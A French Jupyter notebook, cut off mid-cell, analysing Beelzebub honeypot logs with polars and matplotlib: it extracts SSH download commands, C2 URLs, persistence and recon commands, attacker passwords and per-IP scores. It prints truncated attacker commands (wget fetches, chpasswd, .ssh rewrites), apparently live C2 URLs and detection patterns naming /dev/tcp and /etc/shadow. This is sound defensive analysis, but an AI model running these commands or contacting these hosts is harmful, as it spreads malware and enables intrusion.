# Analyse Beelzebub Honeypot — Version Interactive Jupyter

Reproduit fidèlement toutes les sections du script Nushell original avec visualisations interactives.

## Configuration

Ajuster les chemins ci-dessous selon votre installation.

In [1]:
# ═══════════════════════════════════════════════
# Imports nécessaires
# ═══════════════════════════════════════════════
import matplotlib
matplotlib.use('Agg')  # Backend non-interactif
import base64
import gzip
import json
import re
from pathlib import Path
from datetime import datetime
from IPython.display import display, Image

import polars as pl
import matplotlib.pyplot as plt
import matplotlib.dates as mdates
import seaborn as sns

# Configuration des graphiques
plt.style.use('seaborn-v0_8-whitegrid')
plt.rcParams['figure.figsize'] = [12, 6]
plt.rcParams['figure.dpi'] = 100
plt.rcParams['font.size'] = 10

sns.set_palette('husl')

# Configuration
LOGDIR = Path("log")
JSONDIR = Path("json")

# Fonction helper pour afficher les graphiques
def show_plot(fig, name=""):
    """Save figure to file"""
    fig.savefig("plot.png", bbox_inches='tight')
    plt.close(fig)
    if name:
        print(f"** {name} **")
print("[INFO] Imports chargés et configuration définie.")
print(f"  LOGDIR: {LOGDIR}")
print(f"  JSONDIR: {JSONDIR}")

[INFO] Imports chargés et configuration définie.
  LOGDIR: log
  JSONDIR: json


In [ ]:
# ═══════════════════════════════════════════════
# Configuration des chemins
# ═══════════════════════════════════════════════
LOGDIR = Path("log")
JSONDIR = Path("json")
JSONDIR.mkdir(parents=True, exist_ok=True)
print(f"[CONFIG] LOGDIR={LOGDIR} | JSONDIR={JSONDIR}")

In [ ]:
# Helper: numeric sort key for log files

def numeric_sort_key(path: Path):
    """Extract numeric part from filename for proper sorting."""
    import re
    m = re.search(r"\\d+", path.name)
    return int(m.group()) if m else 0

In [2]:
# ═══════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════

def load_gz_ndjson(path: Path) -> list[dict]:
    """Load a single .gz NDJSON file and return a list of records."""
    records = []
    with gzip.open(path, "rt", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                records.append(json.loads(line))
            except json.JSONDecodeError:
                continue
    return records


---

## 0. Chargement des fichiers de logs

In [ ]:
# Load .gz NDJSON files avec tri numérique
filelist = sorted(LOGDIR.glob("beelzebub.json.*.gz"), key=numeric_sort_key)
if not filelist:
    print(f"[ERREUR] Aucun fichier log trouvé dans {LOGDIR}/beelzebub.json.*.gz")
    raise SystemExit(1)

print(f"[INFO] {len(filelist)} fichier(s) log trouvé(s) dans {LOGDIR}/")

all_records = []
for i, path in enumerate(filelist, 1):
    print(f"  [{i}/{len(filelist)}] {path.name}")
    try:
        records = load_gz_ndjson(path)
        all_records.extend(records)
    except Exception as exc:
        print(f"  [WARN] Erreur chargement {path.name} : {exc}")

print(f"[INFO] {len(all_records)} enregistrements bruts chargés.")

df_all = pl.DataFrame(all_records) if all_records else pl.DataFrame()
if not df_all.is_empty():
    df_all = df_all.unnest("event")
else:
    df_all = pl.DataFrame()

# Visualisation du chargement
print(f"\n[INFO] Nombre de protocoles distincts: {df_all.get_column('Protocol').n_unique() if not df_all.is_empty() else 0}")
if not df_all.is_empty():
    df_all.group_by("Protocol").agg(pl.len().alias("count")).sort("count", descending=True)

---

## 1. Extraction SSH brute + HTTP

In [4]:
# SSH events
dfssh = (
    df_all
    .filter(pl.col("Protocol") == "SSH")
    .select([
        "User", "Password", "DateTime", "RemoteAddr",
        "Protocol", "Command", "SourceIp",
    ])
) if not df_all.is_empty() else pl.DataFrame()

# HTTP events
dfhttp = (
    df_all
    .filter(pl.col("Protocol") == "HTTP")
    .select([
        "DateTime", "RemoteAddr", "Protocol", "SourceIp",
        "Headers", "Cookies", "UserAgent",
        "HostHTTPRequest", "Body", "HTTPMethod",
        "RequestURI", "TLSServerName",
    ])
) if not df_all.is_empty() else pl.DataFrame()

ssh_count = dfssh.height
http_count = dfhttp.height
print(f"[INFO] SSH events: {ssh_count} | HTTP events: {http_count}")
print(f"\n[INFO] Top 5 SSH events:")
dfssh.head()


[INFO] SSH events: 24264 | HTTP events: 14936

[INFO] Top 5 SSH events:


User,Password,DateTime,RemoteAddr,Protocol,Command,SourceIp
str,str,str,str,str,str,str
"""admin""","""admin123""","""2026-07-14T22:03:15Z""","""51.83.143.139:46440""","""SSH""","""""","""51.83.143.139"""
"""admin""","""admin123""","""2026-07-14T22:08:16Z""","""51.83.143.139:53984""","""SSH""","""""","""51.83.143.139"""
"""admin""","""admin123""","""2026-07-14T22:13:17Z""","""51.83.143.139:26528""","""SSH""","""""","""51.83.143.139"""
"""admin""","""admin123""","""2026-07-14T22:18:18Z""","""51.83.143.139:33288""","""SSH""","""""","""51.83.143.139"""
"""admin""","""admin123""","""2026-07-14T22:24:14Z""","""51.83.143.139:16158""","""SSH""","""""","""51.83.143.139"""


In [5]:
# Graphique 1: Répartition SSH vs HTTP
fig, axes = plt.subplots(1, 2, figsize=(14, 5))

# Pie chart
protocols = ['SSH', 'HTTP']
counts = [ssh_count, http_count]
colors = ['#e74c3c', '#3498db']
axes[0].pie(counts, labels=protocols, autopct='%1.1f%%', colors=colors, startangle=90)
axes[0].set_title('Répartition des protocoles', fontsize=14, fontweight='bold')

# Bar chart
axes[1].bar(protocols, counts, color=colors, edgecolor='black', linewidth=1.2)
axes[1].set_title('Nombre d\'événements par protocole', fontsize=14, fontweight='bold')
axes[1].set_ylabel('Nombre d\'événements')
axes[1].set_xlabel('Protocole')
for i, v in enumerate(counts):
    axes[1].text(i, v + max(counts)*0.02, str(v), ha='center', fontweight='bold')

plt.tight_layout()
show_plot(fig, "Graphique 1: Répartition SSH vs HTTP")


** Graphique 1: Répartition SSH vs HTTP **


---

## 2. Commandes de téléchargement (wget/curl/ftp/tftp)

In [6]:
# Download commands
download_commands = (
    dfssh
    .filter(pl.col("Command").str.contains("wget|curl|ftp|tftp", literal=False))
    .select(["SourceIp", "Command", "DateTime"])
)
print(f"[INFO] {download_commands.height} commandes de téléchargement détectées")
download_commands


[INFO] 140 commandes de téléchargement détectées


SourceIp,Command,DateTime
str,str,str
"""45.12.1.49""","""cd /tmp;rm -f amd64;wget -t 1 …","""2026-07-06T06:36:08Z"""
"""45.12.1.49""","""cd /tmp;rm -f kal64;wget -t 1 …","""2026-07-06T06:44:12Z"""
"""45.12.1.49""","""cd /etc;rm -f kswpad;wget -t 1…","""2026-07-06T06:44:12Z"""
"""168.100.9.238""","""cd /etc;rm -f kswpad;wget -t 1…","""2026-07-05T12:35:45Z"""
"""168.100.9.238""","""cd /etc;rm -f kswpad;wget -t 1…","""2026-07-05T12:42:23Z"""
…,…,…
"""152.89.61.139""","""cd /tmp;rm -f kal64;wget -t 1 …","""2026-07-07T00:01:47Z"""
"""152.89.61.139""","""cd /etc;rm -f kswpad;wget -t 1…","""2026-07-07T00:01:48Z"""
"""45.12.1.49""","""cd /tmp;rm -f amd64;wget -t 1 …","""2026-07-07T01:33:23Z"""


---

## 3. URLs de C2 extraites des commandes

In [7]:
# C2 URLs
urls = (
    dfssh
    .select(pl.col("Command"))
    .select(pl.col("Command").str.split(" ").explode().alias("token"))
    .group_by("token")
    .agg(pl.len().alias("count"))
    .filter(pl.col("token").str.contains("http://|https://|ftp://|tftp://", literal=False))
    .sort("count", descending=True)
)
print(f"[INFO] {urls.height} URLs de C2 distinctes")
urls.head(20)


[INFO] 20 URLs de C2 distinctes


token,count
str,u32
"""http://35.237.91.38/meow;""",72
"""http://35.237.91.38/meowarm64;""",72
"""http://34.181.210.37/meow;""",28
"""http://34.181.210.37/meowarm64…",28
"""http://195.177.94.72:3594/s/am…",13
…,…
"""http://195.177.94.72:3594/b/li…",2
"""http://168.100.8.224:20369/ksw…",2
"""http://162.252.198.153:31451/k…",1


In [8]:
# Graphique 2: Top 15 URLs C2
if urls.height > 0:
    fig, ax = plt.subplots(figsize=(14, 6))
    
    top_urls = urls.head(15)
    
    # Tronquer les URLs longues pour la lisibilité
    top_urls = top_urls.with_columns(
        pl.when(pl.col("token").str.len_bytes() > 50)
        .then(pl.col("token").str.slice(0, 47) + "...")
        .otherwise(pl.col("token")).alias("token_short")
    )
    
    ax.barh(range(len(top_urls)), top_urls.get_column("count").to_list(), color='gold', edgecolor='black')
    ax.set_yticks(range(len(top_urls)))
    ax.set_yticklabels(top_urls.get_column("token_short").to_list(), fontsize=9)
    ax.set_xlabel('Nombre d\'occurrences')
    ax.set_title('Top 15 URLs C2 (Command & Control)', fontsize=14, fontweight='bold')
    ax.invert_yaxis()
    
    for i, v in enumerate(top_urls.get_column("count").to_list()):
        ax.text(v + top_urls.get_column("count").max()*0.01, i, str(v), va='center', fontweight='bold')
    
    plt.tight_layout()
    show_plot(fig)
else:
    pass


---

## 4. Détection des mécanismes de persistence

In [9]:
# Persistence detection
def detect_pattern(df: pl.DataFrame, pattern: str) -> pl.DataFrame:
    """Filter rows matching a pattern and select relevant columns."""
    return (
        df
        .filter(pl.col("Command").str.contains(pattern, literal=False))
        .select(["SourceIp", "Command", "DateTime"])
    )

cron_persistence = detect_pattern(dfssh, "crontab|cron|/etc/cron")
user_modification = detect_pattern(dfssh, "useradd|usermod|userdel|passwd|adduser|addgroup|deluser|delgroup")
privilege_escalation = detect_pattern(dfssh, "sudo|chmod|chown|setuid|setgid|visudo")
system_modification = detect_pattern(dfssh, "/etc/passwd|/etc/shadow|/etc/sudoers|sshd_config|authorized_keys")
recon_commands = detect_pattern(dfssh, "uname|whoami|ifconfig|ip addr|hostname|netstat|lsof")

print(f"Cron persistence: {cron_persistence.height} events")
print(f"User modification: {user_modification.height} events")
print(f"Privilege escalation: {privilege_escalation.height} events")
print(f"System modification: {system_modification.height} events")
print(f"Recon commands: {recon_commands.height} events")

# Display each category
display(cron_persistence)
display(user_modification)
display(privilege_escalation)
display(system_modification)
display(recon_commands)


Cron persistence: 56 events
User modification: 104 events
Privilege escalation: 696 events
System modification: 530 events
Recon commands: 3654 events


SourceIp,Command,DateTime
str,str,str
"""43.138.191.249""","""crontab -l""","""2026-07-03T23:55:30Z"""
"""117.50.208.11""","""crontab -l""","""2026-07-04T03:07:50Z"""
"""101.126.145.214""","""crontab -l""","""2026-07-04T16:43:29Z"""
"""115.190.142.147""","""crontab -l""","""2026-07-02T02:59:25Z"""
"""203.6.235.51""","""crontab -l""","""2026-07-01T02:45:37Z"""
…,…,…
"""27.128.160.208""","""crontab -l""","""2026-06-01T20:04:07Z"""
"""123.49.38.114""","""crontab -l""","""2026-07-13T04:33:39Z"""
"""91.92.42.168""","""crontab -r ; rm -rf /var/tmp/.…","""2026-07-11T00:01:59Z"""


SourceIp,Command,DateTime
str,str,str
"""43.138.191.249""","""echo -e ""whale\nql6rSTx3WDa3\n…","""2026-07-03T23:55:23Z"""
"""43.138.191.249""","""echo ""whale\nql6rSTx3WDa3\nql6…","""2026-07-03T23:55:25Z"""
"""117.50.208.11""","""echo ""review\nYEMQELP9UiJN\nYE…","""2026-07-04T03:07:45Z"""
"""117.50.208.11""","""echo -e ""review\nYEMQELP9UiJN\…","""2026-07-04T03:15:42Z"""
"""101.126.145.214""","""echo ""root:s3GrebkcC5LD""|chpas…","""2026-07-04T16:43:18Z"""
…,…,…
"""104.248.161.154""","""cat /etc/passwd 2>/dev/null | …","""2026-05-30T13:25:00Z"""
"""104.248.161.154""","""cat /etc/passwd 2>/dev/null | …","""2026-05-29T12:32:54Z"""
"""123.49.38.114""","""echo ""root:Bh7dHTAFe2dh""|chpas…","""2026-07-13T04:33:29Z"""


SourceIp,Command,DateTime
str,str,str
"""172.252.13.101""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-15T03:49:36Z"""
"""211.62.73.218""",""" [ -x ""$bin"" ] || chmod +x ""$…","""2026-07-15T05:06:54Z"""
"""1.162.231.16""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-15T08:53:03Z"""
"""163.227.52.50""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-15T16:05:46Z"""
"""112.6.227.209""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-15T16:08:16Z"""
…,…,…
"""102.210.148.92""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-07T06:19:38Z"""
"""136.248.242.166""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-07T06:55:10Z"""
"""83.219.248.100""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-07T07:00:23Z"""


SourceIp,Command,DateTime
str,str,str
"""172.252.13.101""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-15T03:49:36Z"""
"""1.162.231.16""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-15T08:53:03Z"""
"""163.227.52.50""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-15T16:05:46Z"""
"""112.6.227.209""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-15T16:08:16Z"""
"""69.5.20.232""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-15T16:19:41Z"""
…,…,…
"""102.210.148.92""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-07T06:19:38Z"""
"""136.248.242.166""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-07T06:55:10Z"""
"""83.219.248.100""","""cd ~ && rm -rf .ssh && mkdir .…","""2026-07-07T07:00:23Z"""


SourceIp,Command,DateTime
str,str,str
"""211.62.73.218""","""uname -a""","""2026-07-15T05:06:36Z"""
"""211.62.73.218""","""arch=""$(uname -m || true)""""","""2026-07-15T05:06:54Z"""
"""66.154.105.106""","""uname -s -m""","""2026-07-06T06:36:00Z"""
"""45.12.1.49""","""uname -s""","""2026-07-06T06:36:03Z"""
"""45.12.1.49""","""uname -m""","""2026-07-06T06:36:04Z"""
…,…,…
"""152.89.61.139""","""uname -s""","""2026-07-06T23:53:36Z"""
"""152.89.61.139""","""uname -m""","""2026-07-06T23:53:36Z"""
"""103.219.32.239""","""uname -s -m""","""2026-07-07T01:33:18Z"""


In [10]:
# Graphique 3: Détection des mécanismes de persistence
fig, ax = plt.subplots(figsize=(14, 6))

categories = [
    'Cron\nPersistence',
    'Modif.\nUtilisateurs',
    'Privilege\nEscalation',
    'Modif.\nSystème',
    'Reconnaissance'
]
counts = [
    cron_persistence.height,
    user_modification.height,
    privilege_escalation.height,
    system_modification.height,
    recon_commands.height
]
colors = ['#e74c3c', '#e67e22', '#f39c12', '#27ae60', '#3498db']

bars = ax.barh(categories, counts, color=colors, edgecolor='black', linewidth=1.2, height=0.6)

ax.set_xlabel('Nombre d\'événements', fontsize=12)
ax.set_title('Détection des mécanismes de persistence et d\'escalade', fontsize=14, fontweight='bold')
ax.invert_yaxis()

# Ajouter les valeurs sur les barres
for i, (bar, count) in enumerate(zip(bars, counts)):
    width = bar.get_width()
    ax.text(width + max(counts)*0.01, bar.get_y() + bar.get_height()/2., 
            str(count), ha='left', va='center', fontweight='bold', fontsize=11)

# Grille
ax.grid(axis='x', linestyle='--', alpha=0.7)
ax.set_axisbelow(True)

plt.tight_layout()
show_plot(fig, "Graphique 3: Détection des mécanismes de persistence")


** Graphique 3: Détection des mécanismes de persistence **


---

## 5. Analyse des mots de passe compromis

In [11]:
# Password analysis
password_analysis = (
    dfssh
    .select("Password")
    .filter(pl.col("Password").is_not_null())
    .group_by("Password")
    .agg(pl.len().alias("count"))
    .sort("count", descending=True)
    .head(30)
)
print(f"[INFO] {password_analysis.height} mots de passe distincts analysés")
password_analysis


[INFO] 30 mots de passe distincts analysés


Password,count
str,u32
"""""",11154
"""admin123""",8140
"""345gs5662d34""",452
"""3245gs5662d34""",444
"""0""",404
…,…
"""toor""",15
"""admin@123""",14
"""123321""",14


In [12]:
# Graphique 4: Top 20 mots de passe compromis
if password_analysis.height > 0:
    fig, ax = plt.subplots(figsize=(14, 8))
    
    top_passwords = password_analysis.head(20)
    
    # Tronquer les mots de passe longs
    top_passwords = top_passwords.with_columns(
        pl.when(pl.col("Password").str.len_bytes() > 15)
        .then(pl.col("Password").str.slice(0, 12) + "...")
        .otherwise(pl.col("Password")).alias("pwd_short")
    )
    
    # Normaliser les counts pour la colormap
    max_count = top_passwords.get_column("count").max()
    colors = plt.cm.RdYlGn_r([c / max_count for c in top_passwords.get_column("count").to_list()])
    
    ax.barh(range(len(top_passwords)), top_passwords.get_column("count").to_list(), color=colors, edgecolor='black')
    ax.set_yticks(range(len(top_passwords)))
    ax.set_yticklabels(top_passwords.get_column("pwd_short").to_list(), fontsize=9)
    ax.set_xlabel('Nombre d\'occurrences')
    ax.set_title('Top 20 Mots de Passe Compromis', fontsize=14, fontweight='bold')
    ax.invert_yaxis()
    
    for i, v in enumerate(top_passwords.get_column("count").to_list()):
        ax.text(v + max_count*0.01, i, str(v), va='center', fontweight='bold')
    
    plt.tight_layout()
    show_plot(fig)
else:
    pass


---

## 6. Score d'intensité par attaquant (SourceIp)

In [13]:
# Attack intensity scoring
SCORE_RULES = [
    {"category": "download",      "pattern": "wget|curl|ftp|tftp",      "pts": 2},
    {"category": "priv_esc",      "pattern": "chmod|chown|sudo|visudo", "pts": 3},
    {"category": "user_mgmt",     "pattern": "useradd|usermod|passwd|adduser", "pts": 4},
    {"category": "persistence",   "pattern": "crontab|cron",            "pts": 3},
    {"category": "shell_access",  "pattern": "/bin/sh|/bin/bash|/dev/tcp", "pts": 5},
]

all_scores = []
for rule in SCORE_RULES:
    matched = dfssh.filter(pl.col("Command").str.contains(rule["pattern"], literal=False))
    if not matched.is_empty():
        ip_counts = matched.get_column("SourceIp").value_counts()
        ip_counts = ip_counts.with_columns(
            pl.Series("category", [rule["category"]] * ip_counts.height),
            pl.Series("pts", [rule["pts"]] * ip_counts.height),
        )
        all_scores.append(ip_counts)

if all_scores:
    all_scores_df = pl.concat(all_scores)
    attack_scores = (
        all_scores_df
        .group_by("SourceIp")
        .agg([
            pl.col("pts").sum().alias("total_score"),
            pl.col("category").unique().str.join("; ").alias("categories"),
        ])
        .sort("total_score", descending=True)
    )
else:
    pass


In [14]:
# Graphique 5: Score d'intensité par IP
if attack_scores.height > 0:
    fig, ax = plt.subplots(figsize=(14, 8))
    
    top_attackers = attack_scores.head(20)
    
    # Tronquer les IPs longues si nécessaire
    top_attackers = top_attackers.with_columns(
        pl.col("SourceIp").str.slice(0, 15).alias("ip_short")
    )
    
    max_score = top_attackers.get_column("total_score").max()
    colors = plt.cm.Reds([0.3 + 0.7 * (s / max_score) for s in top_attackers.get_column("total_score").to_list()])
    
    ax.barh(range(len(top_attackers)), top_attackers.get_column("total_score").to_list(), color=colors, edgecolor='black')
    ax.set_yticks(range(len(top_attackers)))
    ax.set_yticklabels(top_attackers.get_column("ip_short").to_list(), fontsize=9)
    ax.set_xlabel('Score d\'intensité')
    ax.set_title('Top 20 Attaquants par Score d\'Intensité', fontsize=14, fontweight='bold')
    ax.invert_yaxis()
    
    for i, v in enumerate(top_attackers.get_column("total_score").to_list()):
        ax.text(v + max_score*0.01, i, str(v), va='center', fontweight='bold')
    
    plt.tight_layout()
    show_plot(fig, "Graphique 5: Score d'intensité par IP")
else:
    pass


** Graphique 5: Score d'intensité par IP **


In [15]:
# Graphique 6: Répartition des catégories d'attaque
if all_scores_df.height > 0:
    fig, axes = plt.subplots(1, 2, figsize=(14, 6))
    
    # Pie chart
    category_counts = all_scores_df.group_by("category").agg(pl.len().alias("count")).sort("count", descending=True)
    axes[0].pie(category_counts.get_column("count").to_list(), 
               labels=category_counts.get_column("category").to_list(),
               autopct='%1.1f%%', 
               startangle=90,
               colors=['#3498db', '#e74c3c', '#e67e22', '#27ae60', '#9b59b6'])
    axes[0].set_title('Répartition des catégories d\'attaque', fontsize=14, fontweight='bold')
    
    # Bar chart
    axes[1].barh(range(len(category_counts)), category_counts.get_column("count").to_list(), 
                color=['#3498db', '#e74c3c', '#e67e22', '#27ae60', '#9b59b6'],
                edgecolor='black')
    axes[1].set_yticks(range(len(category_counts)))
    axes[1].set_yticklabels(category_counts.get_column("category").to_list(), fontsize=10)
    axes[1].set_xlabel('Nombre d\'occurrences')
    axes[1].set_title('Occurrences par catégorie', fontsize=14, fontweight='bold')
    axes[1].invert_yaxis()
    
    for i, v in enumerate(category_counts.get_column("count").to_list()):
        axes[1].text(v + category_counts.get_column("count").max()*0.01, i, str(v), va='center', fontweight='bold')
    
    plt.tight_layout()
    show_plot(fig)
else:
    pass





---

## 7. Domain fronting / DNS spoofing via TLS SNI

In [16]:
# DNS anomalies detection
def detect_dns_anomalies(df: pl.DataFrame) -> list[dict]:
    """Detect domain fronting and DNS spoofing (SNI vs Host mismatch)."""
    df_filtered = df.filter(
        (pl.col("TLSServerName").is_not_null()) | (pl.col("HostHTTPRequest").is_not_null())
    ).select(["TLSServerName", "HostHTTPRequest", "SourceIp", "RequestURI", "DateTime"])

    anomalies = []
    for row in df_filtered.iter_rows(named=True):
        sni = (row.get("TLSServerName") or "").strip()
        host = (row.get("HostHTTPRequest") or "").strip()

        if "google.com" in sni:
            anomalies.append({
                "type": "DNS SPOOFING",
                "SNI": sni, "Host": host,
                "SourceIp": row.get("SourceIp", ""),
                "RequestURI": row.get("RequestURI", ""),
            })
        elif "google.com" in host:
            anomalies.append({
                "type": "DNS SPOOFING (host)",
                "SNI": sni, "Host": host,
                "SourceIp": row.get("SourceIp", ""),
                "RequestURI": row.get("RequestURI", ""),
            })
        elif sni != host and sni and host:
            anomalies.append({
                "type": "DOMAIN MISMATCH",
                "SNI": sni, "Host": host,
                "SourceIp": row.get("SourceIp", ""),
            })

    return anomalies

dns_anomalies = detect_dns_anomalies(dfhttp)
print(f"[INFO] {len(dns_anomalies)} anomalies DNS détectées")

# Display anomalies as DataFrame
if dns_anomalies:
    pl.DataFrame(dns_anomalies)
else:
    pass


[INFO] 0 anomalies DNS détectées


---

## 6. Analyse en Composantes Principales (ACP)

L'ACP permet de visualiser la structure des flux SSH et HTTP selon plusieurs dimensions:
- Fréquence des connexions
- Ports utilisés
- Heures d'activité
- Types de commandes


In [17]:
# Préparation des données pour l'ACP
print("[INFO] Préparation des données pour l'ACP...")

# Feature 1: Nombre de tentatives SSH par IP
ssh_by_ip = dfssh.get_column("SourceIp").value_counts().with_columns(
    pl.col("count").alias("ssh_attempts")
)

# Feature 2: Nombre de requêtes HTTP par IP
http_by_ip = dfhttp.get_column("SourceIp").value_counts().with_columns(
    pl.col("count").alias("http_requests")
)

# Feature 3: Ports SSH utilisés
ssh_ports = (
    dfssh
    .select(pl.col("Command").str.split(" ").alias("words"))
    .explode("words")
    .select(pl.col("words").alias("port"))
    .filter(pl.col("port").str.contains(r'^-[pP]\d+$|^22$|^2222$'))
    .get_column("port")
    .value_counts()
)

# Feature 4: Heures d'activité SSH
ssh_by_hour = (
    dfssh
    .with_columns(
        pl.col("DateTime").str.slice(11, 2).alias("hour")
    )
    .group_by("hour")
    .agg(pl.len().alias("count"))
    .sort("hour")
)

# Feature 5: Heures d'activité HTTP
http_by_hour = (
    dfhttp
    .with_columns(
        pl.col("DateTime").str.slice(11, 2).alias("hour")
    )
    .group_by("hour")
    .agg(pl.len().alias("count"))
    .sort("hour")
)

# Feature 6: Types de commandes SSH
ssh_command_types = (
    dfssh
    .select(pl.col("Command").str.split(" ").first().alias("cmd_type"))
    .filter(pl.col("cmd_type").is_in(["ssh", "scp", "sftp", "nc", "telnet"]))
    .get_column("cmd_type")
    .value_counts()
)

print(f"[INFO] SSH: {ssh_by_ip.height} IPs, {ssh_by_hour.height} heures")
print(f"[INFO] HTTP: {http_by_ip.height} IPs, {http_by_hour.height} heures")
ssh_by_hour

[INFO] Préparation des données pour l'ACP...
[INFO] SSH: 659 IPs, 24 heures
[INFO] HTTP: 231 IPs, 24 heures


/tmp/ipykernel_146093/2826753121.py:51: DeprecationWarning: `is_in` with a collection of the same datatype is ambiguous and deprecated.
Please use `implode` to return to previous behavior.

See https://github.com/pola-rs/polars/issues/22149 for more information.
  .filter(pl.col("cmd_type").is_in(["ssh", "scp", "sftp", "nc", "telnet"]))


hour,count
str,u32
"""00""",859
"""01""",2025
"""02""",654
"""03""",539
"""04""",547
…,…
"""19""",2255
"""20""",1661
"""21""",622


In [18]:
# Normalisation et calcul de l'ACP
import numpy as np
from sklearn.decomposition import PCA
from sklearn.preprocessing import StandardScaler

print("[INFO] Calcul de l'ACP...")

# Créer une matrice de features pour chaque IP
features_by_ip = pl.DataFrame({
    "SourceIp": ssh_by_ip.get_column("SourceIp"),
    "ssh_attempts": ssh_by_ip.get_column("count"),
})

# Ajouter les features HTTP
features_by_ip = features_by_ip.join(http_by_ip, on="SourceIp", how="left").fill_null(0)

# Ajouter le ratio SSH/HTTP
features_by_ip = features_by_ip.with_columns(
    (pl.col("ssh_attempts") / (pl.col("http_requests") + 1)).alias("ssh_http_ratio")
)

# Sélectionner les features numériques
feature_cols = ["ssh_attempts", "http_requests", "ssh_http_ratio"]
data_matrix = features_by_ip.select(feature_cols).to_numpy()

# Normalisation
scaler = StandardScaler()
data_normalized = scaler.fit_transform(data_matrix)

# ACP
pca = PCA(n_components=2)
X_pca = pca.fit_transform(data_normalized)

# Créer un DataFrame avec les composantes
pca_df = pl.DataFrame({
    "PC1": X_pca[:, 0],
    "PC2": X_pca[:, 1],
    "SourceIp": features_by_ip.get_column("SourceIp"),
    "ssh_attempts": features_by_ip.get_column("ssh_attempts"),
    "http_requests": features_by_ip.get_column("http_requests"),
    "ssh_http_ratio": features_by_ip.get_column("ssh_http_ratio"),
})

print(f"[INFO] ACP calculée sur {X_pca.shape[0]} points")
print(f"[INFO] Variance expliquée: PC1={pca.explained_variance_ratio_[0]:.2%}, PC2={pca.explained_variance_ratio_[1]:.2%}")
pca_df.head(10)


[INFO] Calcul de l'ACP...
[INFO] ACP calculée sur 659 points
[INFO] Variance expliquée: PC1=66.67%, PC2=33.33%


PC1,PC2,SourceIp,ssh_attempts,http_requests,ssh_http_ratio
f64,f64,str,u32,u32,f64
-0.127434,-0.04588,"""52.177.169.196""",5,0,5.0
-0.107362,-0.045749,"""203.150.107.244""",10,0,10.0
-0.107362,-0.045749,"""54.38.241.200""",10,0,10.0
-0.107362,-0.045749,"""34.175.118.185""",10,0,10.0
-0.127434,-0.04588,"""38.137.11.14""",5,0,5.0
-0.107362,-0.045749,"""91.208.73.57""",10,0,10.0
0.137513,-0.044162,"""121.178.101.159""",71,0,71.0
-0.107362,-0.045749,"""65.49.139.223""",10,0,10.0
-0.127434,-0.04588,"""31.58.87.216""",5,0,5.0


In [19]:
# Graphique ACP: Scatter plot des composantes principales
fig, ax = plt.subplots(figsize=(14, 10))

# Colorer par nombre de tentatives SSH
scatter = ax.scatter(
    pca_df.get_column("PC1").to_list(),
    pca_df.get_column("PC2").to_list(),
    c=pca_df.get_column("ssh_attempts").to_list(),
    cmap='hot',
    alpha=0.7,
    s=50
)

# Colorbar
cbar = plt.colorbar(scatter, ax=ax)
cbar.set_label('Nombre de tentatives SSH', fontsize=12)

# Annotation des points les plus actifs
top_ips = pca_df.sort("ssh_attempts", descending=True).head(10)
for i, row in enumerate(top_ips.iter_rows(named=True)):
    ax.annotate(
        row["SourceIp"][:12] + '...',
        (row["PC1"], row["PC2"]),
        fontsize=8,
        alpha=0.7,
        xytext=(5, 5),
        textcoords='offset points'
    )

ax.set_xlabel(f'PC1 ({pca.explained_variance_ratio_[0]:.1%} de variance)', fontsize=12)
ax.set_ylabel(f'PC2 ({pca.explained_variance_ratio_[1]:.1%} de variance)', fontsize=12)
ax.set_title('ACP des flux SSH/HTTP - Projection 2D', fontsize=14, fontweight='bold')
ax.axhline(y=0, color='k', linestyle='--', alpha=0.3)
ax.axvline(x=0, color='k', linestyle='--', alpha=0.3)
ax.grid(True, alpha=0.3)

plt.tight_layout()
show_plot(fig, "ACP - Scatter plot des composantes principales")

** ACP - Scatter plot des composantes principales **


In [20]:
# Graphique ACP: Biplot (vecteurs de features)
fig, ax = plt.subplots(figsize=(14, 10))

# Tracer les points
ax.scatter(
    pca_df.get_column("PC1").to_list(),
    pca_df.get_column("PC2").to_list(),
    c=pca_df.get_column("http_requests").to_list(),
    cmap='cool',
    alpha=0.6,
    s=40
)

# Tracer les vecteurs de features
feature_names = feature_cols
loadings = pca.components_

scale = 1.5
for i, name in enumerate(feature_names):
    x = loadings[0, i] * scale
    y = loadings[1, i] * scale
    ax.arrow(0, 0, x, y, head_width=0.1, head_length=0.05, fc='red', ec='red', linewidth=2)
    ax.text(x * 1.1, y * 1.1, name, fontsize=10, color='red', fontweight='bold')

ax.set_xlabel(f'PC1 ({pca.explained_variance_ratio_[0]:.1%} de variance)', fontsize=12)
ax.set_ylabel(f'PC2 ({pca.explained_variance_ratio_[1]:.1%} de variance)', fontsize=12)
ax.set_title('Biplot ACP - Relations entre features et composantes', fontsize=14, fontweight='bold')
ax.axhline(y=0, color='k', linestyle='--', alpha=0.3)
ax.axvline(x=0, color='k', linestyle='--', alpha=0.3)
ax.grid(True, alpha=0.3)
ax.set_aspect('equal')

plt.tight_layout()
show_plot(fig, "ACP - Biplot des features")


** ACP - Biplot des features **


In [21]:
# Graphique ACP: Scree plot (variance expliquée cumulative)
fig, axes = plt.subplots(1, 2, figsize=(16, 6))

# Scree plot - variance expliquée par composante
n_components = len(pca.explained_variance_ratio_)
x = range(1, n_components + 1)
axes[0].bar(x, pca.explained_variance_ratio_, alpha=0.7, color='steelblue', edgecolor='black')
axes[0].plot(x, pca.explained_variance_ratio_, 'o-', color='red', linewidth=2, markersize=8)
axes[0].set_xlabel('Composante principale', fontsize=12)
axes[0].set_ylabel('Variance expliquée', fontsize=12)
axes[0].set_title('Scree plot - Variance expliquée par composante', fontsize=14, fontweight='bold')
axes[0].set_xticks(x)
for i, v in enumerate(pca.explained_variance_ratio_):
    axes[0].text(i+1, v + 0.01, f'{v:.1%}', ha='center', fontweight='bold')

# Courbe cumulative
cumulative = np.cumsum(pca.explained_variance_ratio_)
